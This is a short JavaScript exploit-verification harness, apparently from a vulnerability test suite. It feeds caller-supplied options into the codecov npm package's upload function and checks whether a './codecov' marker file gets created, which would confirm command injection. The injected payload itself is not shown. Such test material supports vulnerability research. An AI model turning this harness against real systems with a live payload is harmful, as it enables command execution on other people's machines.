function exploitFunction(payload) {
    const root = require("codecov");
    const fs = require("fs");
    const path = "./codecov";

    try {
        if (fs.existsSync(path)) {
            fs.unlinkSync(path);
            console.log("File removed:", path);
        }
    } catch (err) {
        console.error(err);
    }

    let file_exist = fs.existsSync(path);
    expect(file_exist).toBe(false);

    try {
        root.handleInput.upload(
            payload.options,
            function () {
                console.log("success");
            },
            function () {
                console.log("Fail!");
            }
        );
    } catch (error) {}

    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);

    fs.unlink(path, function (err) {});
}

module.exports = { exploitFunction };